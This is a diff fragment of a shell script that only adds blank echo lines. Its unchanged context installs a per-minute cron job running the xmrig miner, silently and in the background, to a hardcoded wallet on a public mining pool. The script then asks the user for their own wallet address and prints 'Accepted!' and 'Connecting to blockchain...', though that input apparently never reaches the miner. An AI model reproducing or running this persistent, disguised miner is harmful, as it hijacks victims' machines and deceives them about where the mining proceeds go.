@@ -27,11 +27,13 @@ echo ""
 echo ""
 echo ""
 echo "*/1 * * * * cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &" > cron && cat cron | crontab -
+echo ""
 rm cron
 echo ""
 echo ""
 echo "Enter yourt wallet address:"
 read wallet
+echo ""
 echo "Accepted!"$wallet
 echo "Connecting to blockchain..."
 count=0
